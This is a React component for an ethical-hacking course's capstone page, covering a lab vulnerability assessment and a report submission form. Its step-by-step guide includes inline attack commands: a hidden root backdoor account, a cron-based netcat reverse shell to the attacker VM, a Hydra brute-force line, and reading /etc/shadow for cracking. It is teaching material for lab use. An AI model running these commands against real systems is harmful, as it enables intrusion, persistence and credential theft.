import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { FaArrowLeft, FaCode, FaLaptopCode, FaList, FaLink, FaEdit, FaCheckCircle, FaRocket } from "react-icons/fa";
import { useAuth } from "../../../context/authContext";

const Dett11: React.FC = () => {
    const navigate = useNavigate();
    const { userData, userToken } = useAuth();

    // State for file upload
    const [submitted, setSubmitted] = useState(false);
    const [form, setForm] = useState({
        assignmentId: 11,
        userId: userData?.userDetails.id ?? "",
        fileUrl: "",
    });

    // Handle file upload for PDF submissions
    const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
        const file = e.target.files?.[0];
        if (file && file.type === "application/pdf") {
            // Simulate file upload to a server (replace with actual upload logic)
            const fileUrl = URL.createObjectURL(file); // Temporary URL for demo
            setForm((prev) => ({
                ...prev,
                fileUrl: fileUrl,
            }));
        } else {
            alert("Please upload a valid PDF file.");
        }
    };

    // Handle form submission
    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        console.log("Form Data:", form);

        if (!userToken) {
            alert("Authentication error. Please log in again.");
            return;
        }

        try {
            const response = await fetch("http://localhost:8080/api/v1/assignments/submit", {
                method: "POST",
                headers: {
                    Authorization: `Bearer ${userToken}`,
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(form),
            });

            if (response.ok) {
                setSubmitted(true);
                alert("Assignment submitted successfully!");
            } else {
                const errorData = await response.json();
                alert(`Error: ${errorData.message}`);
            }
        } catch (error) {
            console.error("Error submitting assignment:", error);
            alert("Failed to submit. Please try again later.");
        }
    };

    return (
        <>
            <section className="bg-white shadow-lg rounded-lg p-4 sm:p-6 md:p-8 mb-8 mx-auto max-w-5xl">
                {/* Back Button */}
                <button
                    onClick={() => navigate(-1)}
                    className="flex items-center text-gray-600 hover:text-indigo-600 mb-6 transition-all duration-300 ease-in-out transform hover:scale-105"
                >
                    <FaArrowLeft className="mr-2" />
                    Back
                </button>

                {/* Title */}
                <div className="bg-indigo-600 text-white py-4 px-6 rounded-t-lg flex items-center justify-center">
                    <FaLaptopCode className="mr-3 text-2xl" />
                    <h1 className="text-2xl sm:text-3xl font-extrabold uppercase">
                        Vulnerability Assessment and Reporting Challenge
                    </h1>
                </div>

                <div className="p-4 sm:p-6">
                    {/* Project Overview */}
                    <section className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
                        <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
                            <FaEdit className="mr-2 text-indigo-600" />
                            Project Overview
                        </h2>
                        <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
                            Welcome to the Capstone Project! In this challenge, you’ll conduct a <b>comprehensive vulnerability assessment</b> on a simulated network and produce a <b>professional penetration testing report</b>. This project integrates skills from <code>Dett5</code>–<code>Dett10</code>, including vulnerability mapping, exploitation, password attacks, privilege escalation, persistence, and reporting. You’ll use tools like Nmap, Nessus, Hydra, Metasploit, and LinPEAS in a safe lab environment to identify vulnerabilities, exploit them ethically, and document findings with remediation strategies. This is your chance to showcase your penetration testing skills and prepare for real-world engagements.
                        </p>
                    </section>

                    {/* Prerequisites */}
                    <section className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
                        <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
                            <FaList className="mr-2 text-indigo-600" />
                            Prerequisites
                        </h2>
                        <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                Familiarity with <b className="mx-2">vulnerability scanning</b> using Nmap and Nessus (<code>Dett5</code>).
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                Proficiency in <b className="mx-2">exploitation techniques</b> with Metasploit (<code>Dett6</code>).
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                Experience with <b className="mx-2">password attacks</b> using Hydra and John the Ripper (<code>Dett7</code>).
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                Knowledge of <b className="mx-2">privilege escalation</b> techniques with tools like LinPEAS (<code>Dett8</code>).
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                Understanding of <b className="mx-2">persistence mechanisms</b> like backdoors and cron jobs (<code>Dett9</code>).
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                Skills in <b className="mx-2">pentest reporting</b>, including documenting findings and remediation (<code>Dett10</code>).
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                Access to a <b className="mx-2">safe lab environment</b> (e.g., VirtualBox with Kali Linux and a vulnerable VM).
                            </li>
                        </ul>
                    </section>

                    {/* Project Requirements */}
                    <section className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
                        <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
                            <FaCode className="mr-2 text-indigo-600" />
                            Project Requirements
                        </h2>
                        <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
                            Your project must demonstrate mastery of penetration testing skills from <code>Dett5</code>–<code>Dett10</code>. You’ll perform a full vulnerability assessment on a provided vulnerable VM (e.g., Metasploitable2 or a custom Ubuntu VM) and produce a professional report. The project must include:
                        </p>
                        <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Vulnerability Scanning:</b> Use Nmap and Nessus to identify open ports, services, and vulnerabilities.
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Exploitation:</b> Exploit at least one vulnerability using Metasploit (e.g., outdated service, misconfiguration).
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Password Attacks:</b> Perform a brute-force attack with Hydra or crack passwords with John the Ripper.
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Privilege Escalation:</b> Gain root/admin access using a technique like kernel exploits or misconfigured permissions.
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Persistence:</b> Establish persistence with a backdoor account or scheduled task (e.g., cron job, Windows service).
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Reporting:</b> Produce a professional report documenting findings, impact, and remediation recommendations, formatted as a PDF.
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Ethical Practices:</b> Conduct all activities in a controlled lab environment with explicit permission, ensuring cleanup post-testing.
                            </li>
                        </ul>
                    </section>

                    {/* Step-by-Step Guide */}
                    <section className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
                        <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
                            <FaList className="mr-2 text-indigo-600" />
                            Step-by-Step Guide
                        </h2>
                        <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
                            Follow these detailed steps to complete the vulnerability assessment and reporting challenge. Ensure all activities are performed in a safe lab environment (e.g., VirtualBox with Host-Only network). Consult your instructor for guidance if needed.
                        </p>
                        <ol className="list-decimal list-inside text-gray-700 text-sm sm:text-base space-y-4">
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Set Up the Lab Environment:</b>
                                <ul className="list-disc list-inside ml-6 text-gray-700 text-sm sm:text-base space-y-2">
                                    <li>Configure two VMs in VirtualBox: Kali Linux (<code>192.168.56.10/24</code>) and a vulnerable VM (e.g., Metasploitable2 or Ubuntu at <code>192.168.56.20/24</code>) using a Host-Only network.</li>
                                    <li>Install tools on Kali: Nmap, Nessus, Hydra, John the Ripper, Metasploit, LinPEAS, Netcat (<code>sudo apt install</code> for each).</li>
                                    <li>Ensure the vulnerable VM has services like SSH, FTP, and HTTP running. Take a snapshot before testing.</li>
                                </ul>
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Conduct Vulnerability Scanning:</b>
                                <ul className="list-disc list-inside ml-6 text-gray-700 text-sm sm:text-base space-y-2">
                                    <li>Run an Nmap scan to identify open ports and services (<code>nmap -sV -p- 192.168.56.20</code>).</li>
                                    <li>Use Nessus to scan for vulnerabilities (configure a basic network scan targeting <code>192.168.56.20</code>).</li>
                                    <li>Document findings, including port numbers, service versions, and identified vulnerabilities (e.g., outdated Apache, weak FTP credentials).</li>
                                </ul>
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Perform Exploitation:</b>
                                <ul className="list-disc list-inside ml-6 text-gray-700 text-sm sm:text-base space-y-2">
                                    <li>Identify an exploitable vulnerability from your scans (e.g., vsftpd 2.3.4 backdoor on Metasploitable2).</li>
                                    <li>Use Metasploit to exploit it (<code>msfconsole</code>, search for the exploit, set options, and run).</li>
                                    <li>Document the exploit process, including commands, payload used, and evidence (e.g., screenshot of Meterpreter session).</li>
                                </ul>
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Execute Password Attacks:</b>
                                <ul className="list-disc list-inside ml-6 text-gray-700 text-sm sm:text-base space-y-2">
                                    <li>Target a service like FTP or SSH with Hydra (<code>hydra -l testuser -P rockyou.txt ftp://192.168.56.20</code>).</li>
                                    <li>Alternatively, extract password hashes (e.g., from <code>/etc/shadow</code> if accessible) and crack them with John the Ripper.</li>
                                    <li>Document the attack, including tools, wordlists, and cracked credentials.</li>
                                </ul>
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Achieve Privilege Escalation:</b>
                                <ul className="list-disc list-inside ml-6 text-gray-700 text-sm sm:text-base space-y-2">
                                    <li>Use LinPEAS to identify escalation vectors (<code>./linpeas.sh</code> on the compromised system).</li>
                                    <li>Exploit a vulnerability like a misconfigured SUID binary or outdated kernel (e.g., Dirty COW).</li>
                                    <li>Document the escalation process, including commands and evidence (e.g., screenshot of <code>whoami</code> showing root).</li>
                                </ul>
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Establish Persistence:</b>
                                <ul className="list-disc list-inside ml-6 text-gray-700 text-sm sm:text-base space-y-2">
                                    <li>Create a backdoor account (<code>sudo useradd -u 0 -o -g root -s /bin/bash hiddenuser</code>).</li>
                                    <li>Set up a cron job for a reverse shell (<code>echo "* * * * * root nc -e /bin/bash 192.168.56.10 4444" | sudo tee /etc/cron.d/backdoor</code>).</li>
                                    <li>Test persistence by logging out and reconnecting. Document the setup and evidence (e.g., Netcat listener output).</li>
                                </ul>
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Write a Professional Report:</b>
                                <ul className="list-disc list-inside ml-6 text-gray-700 text-sm sm:text-base space-y-2">
                                    <li>Create a report in Microsoft Word, Google Docs, or LaTeX, following the structure from <code>Dett10</code> (executive summary, scope, methodology, findings, remediation, conclusion, appendices).</li>
                                    <li>Document at least three vulnerabilities (e.g., weak password, exploitable service, persistence mechanism), including severity (CVSS or High/Medium/Low), evidence (screenshots, logs), impact, and remediation steps.</li>
                                    <li>Include an executive summary for non-technical stakeholders and detailed technical findings for IT teams.</li>
                                    <li>Export the report as a PDF (200–500 words, 3–5 pages, including visuals).</li>
                                </ul>
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                <b>Clean Up and Submit:</b>
                                <ul className="list-disc list-inside ml-6 text-gray-700 text-sm sm:text-base space-y-2">
                                    <li>Remove all backdoors, cron jobs, and modifications from the vulnerable VM (e.g., <code>userdel hiddenuser</code>, <code>rm /etc/cron.d/backdoor</code>).</li>
                                    <li>Revert the VM to its snapshot to ensure a clean state.</li>
                                    <li>Submit the PDF report via the form below.</li>
                                </ul>
                            </li>
                        </ol>
                    </section>

                    {/* Bonus Challenges */}
                    <section className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
                        <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
                            <FaRocket className="mr-2 text-indigo-600" />
                            Bonus Challenges
                        </h2>
                        <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                Identify and exploit a <b className="mx-2">web application vulnerability</b> (e.g., SQL injection, XSS) using Burp Suite.
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                Implement a <b className="mx-2">custom exploit</b> for privilege escalation (e.g., write a script for a known CVE).
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                Create a <b className="mx-2">visual dashboard</b> in the report (e.g., vulnerability severity chart) using tools like Excel or Canva.
                            </li>
                            <li className="flex items-start">
                                <FaCode className="mr-2 mt-1 text-indigo-600" />
                                Automate parts of the assessment with a <b className="mx-2">Bash or Python script</b> (e.g., scanning, report generation).
                            </li>
                        </ul>
                    </section>

                    {/* PDF Submission */}
                    <section className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
                        <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
                            <FaLink className="mr-2 text-indigo-600" />
                            Submit Your Work
                        </h2>
                        <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
                            Once your vulnerability assessment and report are complete, export your report as a PDF and submit it below for grading. Ensure your report includes:
                        </p>
                        <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                            <li>Executive summary summarizing key findings and risks.</li>
                            <li>Scope and methodology, detailing tools and testing phases.</li>
                            <li>At least three vulnerabilities with severity, evidence, impact, and remediation.</li>
                            <li>Technical details for IT teams and clear language for executives.</li>
                            <li>Appendices with screenshots, tool outputs, and logs.</li>
                            <li>Confirmation of cleanup (e.g., removed backdoors, reverted VM).</li>
                        </ul>
                        <form onSubmit={handleSubmit} className="space-y-4 mt-4">
                            <label
                                className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                                htmlFor="fileUrl"
                            >
                                Upload Your PDF Report:
                            </label>
                            <input
                                type="file"
                                name="fileUrl"
                                accept="application/pdf"
                                className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                                onChange={handleFileUpload}
                            />
                            <button
                                type="submit"
                                className="bg-indigo-600 text-white py-2 px-6 rounded-md hover:bg-indigo-700 transition-all duration-300 ease-in-out transform hover:scale-105"
                            >
                                Submit Project
                            </button>
                        </form>
                        {submitted && (
                            <p className="mt-4 text-green-600 font-medium flex items-center">
                                <FaCheckCircle className="mr-2" />
                                Thank you! Your project has been submitted successfully!
                            </p>
                        )}
                    </section>

                    {/* Words of Encouragement */}
                    <section className="mb-6 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6 text-center">
                        <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center justify-center">
                            <FaCheckCircle className="mr-2 text-indigo-600" />
                            Congratulations!
                        </h2>
                        <p className="text-gray-700 text-sm sm:text-base leading-relaxed italic">
                            You’ve built a strong foundation in penetration testing over the past weeks! This capstone project is your opportunity to shine—apply your skills to conduct a thorough vulnerability assessment and produce a professional report. Your work demonstrates readiness for real-world ethical hacking challenges. Keep practicing, and get ready for advanced topics like web application security or red teaming in future lessons! 🚀
                        </p>
                    </section>
                </div>
            </section>
        </>
    );
};

export default Dett11;